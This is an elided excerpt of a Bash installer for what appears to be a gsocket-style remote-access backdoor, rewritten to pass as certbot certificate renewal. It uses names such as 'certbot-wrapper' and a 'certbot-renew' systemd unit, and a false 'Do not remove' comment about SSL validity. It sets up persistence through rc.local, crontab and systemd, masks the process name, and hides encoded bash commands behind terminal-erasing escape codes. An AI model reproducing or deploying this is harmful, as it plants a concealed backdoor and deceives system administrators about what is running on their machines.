...
BIN_HIDDEN_NAME_DEFAULT="certbot-wrapper"
...
init_dstbin()
{
	...
	try_dstdir "${GS_PREFIX}${HOME}/.local/${CONFIG_DIR_NAME}" && return
...
init_vars()
{
	...
	SERVICE_HIDDEN_NAME="certbot-renew"
	...
	SERVICE_FILE="${SERVICE_DIR}/certbot-renew.service"
...
mk_encode()
{
	echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} 2>/dev/null #\\033[2K\\033[1A"
}
...
init_setup()
{
	...
	NOTE_DONOTREMOVE="# NOTE: Do not remove or modify this job. This job ensures SSL/TLS certificates remain valid"
	...
	RCLOCAL_LINE="${ENV_LINE[*]}HOME=$HOME SHELL=/bin/bash --noprofile --norc TERM=xterm-256color GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\" 2>/dev/null"
	...
	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || ${ENV_LINE[*]}SHELL=/bin/bash --noprofile --norc TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\" 2>/dev/null"
...
uninstall()
{
	...
	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/${hn}"
			uninstall_rm "${GS_PREFIX}${HOME}/.local/${cn}/renew.conf"  # SEC_NAME
		done
		...
		uninstall_rm "${RCLOCAL_DIR}/renew.conf"  # SEC_NAME
		uninstall_rm "${GS_PREFIX}/usr/bin/renew.conf" # SEC_NAME

		uninstall_rm "/dev/shm/renew.conf" # SEC_NAME
		uninstall_rm "/tmp/.gsusr-${UID}renew.conf" # SEC_NAME

		uninstall_rm "${PWD}/renew.conf" # SEC_NAME
		...
		uninstall_rm "${SERVICE_DIR}/renew.conf"  # SYSTEMD_SEC_FILE / SEC_NAME
	done
...
install_system_systemd()
{
	...
	if [[ -f "${SERVICE_FILE}" ]]; then
		((IS_INSTALLED+=1))
		IS_SKIPPED=1
		if systemctl is-active "certbot-renew" &>/dev/null; then
			IS_GS_RUNNING=1
		fi
		IS_SYSTEMD=1
	...
	echo "[Unit]
Description=Certificate Auto-Renewal Worker
...
WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
	...
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/certbot-renew.service" "${SERVICE_FILE}"

	systemctl enable "certbot-renew" &>/dev/null || { rm -f "${SERVICE_FILE:?}" "${SYSTEMD_SEC_FILE:?}"; return; } # did not work... 
...
gs_start_systemd()
{
	...
	if [[ -z "$IS_GS_RUNNING" ]]; then
		...
		systemctl restart "certbot-renew" &>/dev/null
		if ! systemctl is-active "certbot-renew" &>/dev/null; then
			FAIL_OUT "Check ${CM}systemctl start certbot-renew${CN}."
			exit_code 255
		fi
		IS_GS_RUNNING=1
		OK_OUT
